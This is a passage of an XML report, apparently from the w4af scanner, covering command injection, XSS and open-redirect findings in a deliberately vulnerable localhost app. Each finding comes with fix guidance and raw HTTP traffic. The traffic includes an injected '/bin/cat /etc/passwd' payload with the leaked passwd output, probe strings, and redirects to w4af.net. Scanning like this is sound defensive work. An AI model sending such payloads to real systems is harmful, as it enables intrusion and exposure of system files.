

It was possible to inject and verify the execution of specific Operating
System commands which indicates that proper input sanitisation is not
occurring.</long-description>
    <fix-guidance>It is recommended that untrusted data is never used to form a command
to be executed by the OS.

To validate data, the application should ensure that the supplied value 
contains only the characters that are required to perform the
required action.

For example, where the form field expects an IP address, only numbers
and periods should be accepted. Additionally, all control operators
(`&amp;`, `&amp;&amp;`, `|`, `||`, `$`, `\`, `#`) should be explicitly denied
and never accepted as valid input by the server.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246950/OS%20Commanding" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/OS_Command_Injection" />
    </references>

    <http-transactions>
            <http-transaction id="2288">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_5?ipaddress=%0A%2Fbin%2Fcat%20%2Fetc%2Fpasswd HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:07:40 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiQnVzeUJveCB2MS4yOS4zICgyMDE5LTAxLTI0IDA3OjQ1OjA3IFVUQykgbXVsdGktY2FsbCBiaW5hcnkuXG5cblVzYWdlOiBwaW5nIFtPUFRJT05TXSBIT1NUXG5cblNlbmQgSUNNUCBFQ0hPX1JFUVVFU1QgcGFja2V0cyB0byBuZXR3b3JrIGhvc3RzXG5cblx0LTQsLTZcdFx0Rm9yY2UgSVAgb3IgSVB2NiBuYW1lIHJlc29sdXRpb25cblx0LWMgQ05UXHRcdFNlbmQgb25seSBDTlQgcGluZ3Ncblx0LXMgU0laRVx0XHRTZW5kIFNJWkUgZGF0YSBieXRlcyBpbiBwYWNrZXRzIChkZWZhdWx0IDU2KVxuXHQtQVx0XHRQaW5nIGFzIHNvb24gYXMgcmVwbHkgaXMgcmVjZXZpZWRcblx0LXQgVFRMXHRcdFNldCBUVExcblx0LUkgSUZBQ0UvSVBcdFNvdXJjZSBpbnRlcmZhY2Ugb3IgSVAgYWRkcmVzc1xuXHQtVyBTRUNcdFx0U2Vjb25kcyB0byB3YWl0IGZvciB0aGUgZmlyc3QgcmVzcG9uc2UgKGRlZmF1bHQgMTApXG5cdFx0XHQoYWZ0ZXIgYWxsIC1jIENOVCBwYWNrZXRzIGFyZSBzZW50KVxuXHQtdyBTRUNcdFx0U2Vjb25kcyB1bnRpbCBwaW5nIGV4aXRzIChkZWZhdWx0OmluZmluaXRlKVxuXHRcdFx0KGNhbiBleGl0IGVhcmxpZXIgd2l0aCAtYyBDTlQpXG5cdC1xXHRcdFF1aWV0LCBvbmx5IGRpc3BsYXkgb3V0cHV0IGF0IHN0YXJ0XG5cdFx0XHRhbmQgd2hlbiBmaW5pc2hlZFxuXHQtcCBIRVhCWVRFXHRQYXR0ZXJuIHRvIHVzZSBmb3IgcGF5bG9hZFxucm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoXG5iaW46eDoxOjE6YmluOi9iaW46L3NiaW4vbm9sb2dpblxuZGFlbW9uOng6MjoyOmRhZW1vbjovc2Jpbjovc2Jpbi9ub2xvZ2luXG5hZG06eDozOjQ6YWRtOi92YXIvYWRtOi9zYmluL25vbG9naW5cbmxwOng6NDo3OmxwOi92YXIvc3Bvb2wvbHBkOi9zYmluL25vbG9naW5cbnN5bmM6eDo1OjA6c3luYzovc2JpbjovYmluL3N5bmNcbnNodXRkb3duOng6NjowOnNodXRkb3duOi9zYmluOi9zYmluL3NodXRkb3duXG5oYWx0Ong6NzowOmhhbHQ6L3NiaW46L3NiaW4vaGFsdFxubWFpbDp4Ojg6MTI6bWFpbDovdmFyL3Nwb29sL21haWw6L3NiaW4vbm9sb2dpblxubmV3czp4Ojk6MTM6bmV3czovdXNyL2xpYi9uZXdzOi9zYmluL25vbG9naW5cbnV1Y3A6eDoxMDoxNDp1dWNwOi92YXIvc3Bvb2wvdXVjcHB1YmxpYzovc2Jpbi9ub2xvZ2luXG5vcGVyYXRvcjp4OjExOjA6b3BlcmF0b3I6L3Jvb3Q6L2Jpbi9zaFxubWFuOng6MTM6MTU6bWFuOi91c3IvbWFuOi9zYmluL25vbG9naW5cbnBvc3RtYXN0ZXI6eDoxNDoxMjpwb3N0bWFzdGVyOi92YXIvc3Bvb2wvbWFpbDovc2Jpbi9ub2xvZ2luXG5jcm9uOng6MTY6MTY6Y3JvbjovdmFyL3Nwb29sL2Nyb246L3NiaW4vbm9sb2dpblxuZnRwOng6MjE6MjE6Oi92YXIvbGliL2Z0cDovc2Jpbi9ub2xvZ2luXG5zc2hkOng6MjI6MjI6c3NoZDovZGV2L251bGw6L3NiaW4vbm9sb2dpblxuYXQ6eDoyNToyNTphdDovdmFyL3Nwb29sL2Nyb24vYXRqb2JzOi9zYmluL25vbG9naW5cbnNxdWlkOng6MzE6MzE6U3F1aWQ6L3Zhci9jYWNoZS9zcXVpZDovc2Jpbi9ub2xvZ2luXG54ZnM6eDozMzozMzpYIEZvbnQgU2VydmVyOi9ldGMvWDExL2ZzOi9zYmluL25vbG9naW5cbmdhbWVzOng6MzU6MzU6Z2FtZXM6L3Vzci9nYW1lczovc2Jpbi9ub2xvZ2luXG5wb3N0Z3Jlczp4OjcwOjcwOjovdmFyL2xpYi9wb3N0Z3Jlc3FsOi9iaW4vc2hcbmN5cnVzOng6ODU6MTI6Oi91c3IvY3lydXM6L3NiaW4vbm9sb2dpblxudnBvcG1haWw6eDo4OTo4OTo6L3Zhci92cG9wbWFpbDovc2Jpbi9ub2xvZ2luXG5udHA6eDoxMjM6MTIzOk5UUDovdmFyL2VtcHR5Oi9zYmluL25vbG9naW5cbnNtbXNwOng6MjA5OjIwOTpzbW1zcDovdmFyL3Nwb29sL21xdWV1ZTovc2Jpbi9ub2xvZ2luXG5ndWVzdDp4OjQwNToxMDA6Z3Vlc3Q6L2Rldi9udWxsOi9zYmluL25vbG9naW5cbm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovOi9zYmluL25vbG9naW5cbiIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[2578]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_1" var="id">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_1&quot;, using HTTP method GET. The sent data was: &quot;id=&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="2578">

    <http-request>
        <status>GET http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_1?id=41qn7%3C41qn741qn7--%3E41qn741qn7%2A%2F41qn741qn7%2A%2F%3A%28%22%2741qn741qn7%3A41qn741qn7%0A41qn741qn7%2241qn741qn7%2741qn741qn7%6041qn741qn7%20%3D41qn7 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:07:43 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="634" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogZmFsc2UsICJtb3JlSW5mbyI6IFN0YXRlbWVudENhbGxiYWNrOyBiYWQgU1FMIGdyYW1tYXIgW3NlbGVjdCAqIGZyb20gY2FycyB3aGVyZSBpZD00MXFuNzw0MXFuNzQxcW43LS0+NDFxbjc0MXFuNyovNDFxbjc0MXFuNyovOigiJzQxcW43NDFxbjc6NDFxbjc0MXFuNwo0MXFuNzQxcW43IjQxcW43NDFxbjcnNDFxbjc0MXFuN2A0MXFuNzQxcW43ID00MXFuN107IG5lc3RlZCBleGNlcHRpb24gaXMgb3JnLmgyLmpkYmMuSmRiY1NRTEV4Y2VwdGlvbjogU3ludGF4IGVycm9yIGluIFNRTCBzdGF0ZW1lbnQgInNlbGVjdCAqIGZyb20gY2FycyB3aGVyZSBpZD00MXFuNzw0MXFuNzQxcW43LS0+NDFxbjc0MXFuNyovNDFxbjc0MXFuNyovOigiIic0MXFuNzQxcW43OjQxcW43NDFxbjcKNDFxbjc0MXFuN1sqXSIiNDFxbjc0MXFuNyc0MXFuNzQxcW43YDQxcW43NDFxbjcgPTQxcW43IjsgU1FMIHN0YXRlbWVudDoKc2VsZWN0ICogZnJvbSBjYXJzIHdoZXJlIGlkPTQxcW43PDQxcW43NDFxbjctLT40MXFuNzQxcW43Ki80MXFuNzQxcW43Ki86KCInNDFxbjc0MXFuNzo0MXFuNzQxcW43CjQxcW43NDFxbjciNDFxbjc0MXFuNyc0MXFuNzQxcW43YDQxcW43NDFxbjcgPTQxcW43IFs0MjAwMC0xNzZdfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[2779]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_2" var="id">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_2&quot;, using HTTP method GET. The sent data was: &quot;id=&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="2779">

    <http-request>
        <status>GET http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_2?id=gkjin%3Cgkjingkjin--%3Egkjingkjin%2A%2Fgkjingkjin%2A%2F%3A%28%22%27gkjingkjin%3Agkjingkjin%0Agkjingkjin%22gkjingkjin%27gkjingkjin%60gkjingkjin%20%3Dgkjin HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:07:48 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="640" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogZmFsc2UsICJtb3JlSW5mbyI6IFN0YXRlbWVudENhbGxiYWNrOyBiYWQgU1FMIGdyYW1tYXIgW3NlbGVjdCAqIGZyb20gY2FycyB3aGVyZSBpZD0nZ2tqaW48Z2tqaW5na2ppbi0tPmdramluZ2tqaW4qL2dramluZ2tqaW4qLzooIidna2ppbmdramluOmdramluZ2tqaW4KZ2tqaW5na2ppbiJna2ppbmdramluJ2dramluZ2tqaW5gZ2tqaW5na2ppbiA9Z2tqaW4nXTsgbmVzdGVkIGV4Y2VwdGlvbiBpcyBvcmcuaDIuamRiYy5KZGJjU1FMRXhjZXB0aW9uOiBTeW50YXggZXJyb3IgaW4gU1FMIHN0YXRlbWVudCAic2VsZWN0ICogZnJvbSBjYXJzIHdoZXJlIGlkPSdna2ppbjxna2ppbmdramluLS0+Z2tqaW5na2ppbiovZ2tqaW5na2ppbiovOigiIidna2ppbmdramluOmdramluZ2tqaW4KZ2tqaW5na2ppblsqXSIiZ2tqaW5na2ppbidna2ppbmdramluYGdramluZ2tqaW4gPWdramluJyI7IFNRTCBzdGF0ZW1lbnQ6CnNlbGVjdCAqIGZyb20gY2FycyB3aGVyZSBpZD0nZ2tqaW48Z2tqaW5na2ppbi0tPmdramluZ2tqaW4qL2dramluZ2tqaW4qLzooIidna2ppbmdramluOmdramluZ2tqaW4KZ2tqaW5na2ppbiJna2ppbmdramluJ2dramluZ2tqaW5gZ2tqaW5na2ppbiA9Z2tqaW4nIFs0MjAwMC0xNzZdfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[3088]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_3" var="id">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;id=mci1m%3Cmci1m&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="3088">

    <http-request>
        <status>GET http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_3?id=mci1m%3Cmci1m HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:07:58 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="390" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogZmFsc2UsICJtb3JlSW5mbyI6IFN0YXRlbWVudENhbGxiYWNrOyBTUUwgW3NlbGVjdCAqIGZyb20gY2FycyB3aGVyZSBpZD0nbWNpMW08bWNpMW0nXTsgRGF0YSBjb252ZXJzaW9uIGVycm9yIGNvbnZlcnRpbmcgIm1jaTFtPG1jaTFtIjsgU1FMIHN0YXRlbWVudDoKc2VsZWN0ICogZnJvbSBjYXJzIHdoZXJlIGlkPSdtY2kxbTxtY2kxbScgWzIyMDE4LTE3Nl07IG5lc3RlZCBleGNlcHRpb24gaXMgb3JnLmgyLmpkYmMuSmRiY1NRTEV4Y2VwdGlvbjogRGF0YSBjb252ZXJzaW9uIGVycm9yIGNvbnZlcnRpbmcgIm1jaTFtPG1jaTFtIjsgU1FMIHN0YXRlbWVudDoKc2VsZWN0ICogZnJvbSBjYXJzIHdoZXJlIGlkPSdtY2kxbTxtY2kxbScgWzIyMDE4LTE3Nl19</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[3308]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_4" var="id">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_4&quot;, using HTTP method GET. The sent data was: &quot;id=slind%3Cslind&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="3308">

    <http-request>
        <status>GET http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_4?id=slind%3Cslind HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:03 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="349" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogZmFsc2UsICJtb3JlSW5mbyI6IFByZXBhcmVkU3RhdGVtZW50Q2FsbGJhY2s7IERhdGEgY29udmVyc2lvbiBlcnJvciBjb252ZXJ0aW5nICJzbGluZDxzbGluZCI7IFNRTCBzdGF0ZW1lbnQ6CnNlbGVjdCAqIGZyb20gY2FycyB3aGVyZSBpZD0nc2xpbmQ8c2xpbmQnIFsyMjAxOC0xNzZdOyBuZXN0ZWQgZXhjZXB0aW9uIGlzIG9yZy5oMi5qZGJjLkpkYmNTUUxFeGNlcHRpb246IERhdGEgY29udmVyc2lvbiBlcnJvciBjb252ZXJ0aW5nICJzbGluZDxzbGluZCI7IFNRTCBzdGF0ZW1lbnQ6CnNlbGVjdCAqIGZyb20gY2FycyB3aGVyZSBpZD0nc2xpbmQ8c2xpbmQnIFsyMjAxOC0xNzZdfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[3952]" method="GET" name="Insecure redirection" plugin="global_redirect" severity="Medium" url="http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_1" var="returnTo">
    <description>Global redirect was found at: &quot;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_1&quot;, using HTTP method GET. The sent data was: &quot;returnTo=%2F%2Fw4af.net&quot; The modified parameter was &quot;returnTo&quot;.</description>

    <long-description>Web applications occasionally use parameter values to store the
address of the page to which the client will be redirected -- for
example: `yoursite.com/page.asp?redirect=www.yoursite.com/404.asp`

An
unvalidated redirect occurs when the client is able to modify the
affected parameter value in the request and thus control the location
of the redirection. For example, the following URL
`yoursite.com/page.asp?redirect=www.anothersite.com` will redirect to
`www.anothersite.com`.

Cyber-criminals will abuse these
vulnerabilities in social engineering attacks to get users to
unknowingly visit malicious web sites.

The tool has discovered that
the server does not validate the parameter value prior to redirecting
the client to the injected value.</long-description>
    <fix-guidance>The application should ensure that the supplied value for a redirect
is permitted. This can be achieved by performing whitelisting on the
parameter value.

The whitelist should contain a list of pages or
sites that the application is permitted to redirect users to. If the
supplied value does not match any value in the whitelist then the
server should redirect to a standard error page.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="OWASP Top 10 2010" url="https://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards" />
    </references>

    <http-transactions>
            <http-transaction id="3952">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_1?returnTo=%2F%2Fw4af.net HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:20 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="//w4af.net" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[4189]" method="GET" name="Insecure redirection" plugin="global_redirect" severity="Medium" url="http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_2" var="returnTo">
    <description>Global redirect was found at: &quot;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_2&quot;, using HTTP method GET. The sent data was: &quot;returnTo=%2F%2Fw4af.net&quot; The modified parameter was &quot;returnTo&quot;.</description>

    <long-description>Web applications occasionally use parameter values to store the
address of the page to which the client will be redirected -- for
example: `yoursite.com/page.asp?redirect=www.yoursite.com/404.asp`

An
unvalidated redirect occurs when the client is able to modify the
affected parameter value in the request and thus control the location
of the redirection. For example, the following URL
`yoursite.com/page.asp?redirect=www.anothersite.com` will redirect to
`www.anothersite.com`.

Cyber-criminals will abuse these
vulnerabilities in social engineering attacks to get users to
unknowingly visit malicious web sites.

The tool has discovered that
the server does not validate the parameter value prior to redirecting
the client to the injected value.</long-description>
    <fix-guidance>The application should ensure that the supplied value for a redirect
is permitted. This can be achieved by performing whitelisting on the
parameter value.

The whitelist should contain a list of pages or
sites that the application is permitted to redirect users to. If the
supplied value does not match any value in the whitelist then the
server should redirect to a standard error page.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="OWASP Top 10 2010" url="https://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards" />
    </references>

    <http-transactions>
            <http-transaction id="4189">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_2?returnTo=%2F%2Fw4af.net HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:22 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="//w4af.net" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[4744]" method="GET" name="Insecure redirection" plugin="global_redirect" severity="Medium" url="http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_3" var="returnTo">
    <description>Global redirect was found at: &quot;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;returnTo=localhost%40w4af.net&quot; The modified parameter was &quot;returnTo&quot;.</description>

    <long-description>Web applications occasionally use parameter values to store the
address of the page to which the client will be redirected -- for
example: `yoursite.com/page.asp?redirect=www.yoursite.com/404.asp`

An
unvalidated redirect occurs when the client is able to modify the
affected parameter value in the request and thus control the location
of the redirection. For example, the following URL
`yoursite.com/page.asp?redirect=www.anothersite.com` will redirect to
`www.anothersite.com`.

Cyber-criminals will abuse these
vulnerabilities in social engineering attacks to get users to
unknowingly visit malicious web sites.

The tool has discovered that
the server does not validate the parameter value prior to redirecting
the client to the injected value.</long-description>
    <fix-guidance>The application should ensure that the supplied value for a redirect
is permitted. This can be achieved by performing whitelisting on the
parameter value.

The whitelist should contain a list of pages or
sites that the application is permitted to redirect users to. If the
supplied value does not match any value in the whitelist then the
server should redirect to a standard error page.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="OWASP Top 10 2010" url="https://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards" />
    </references>

    <http-transactions>
            <http-transaction id="4744">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_3?returnTo=localhost%40w4af.net HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
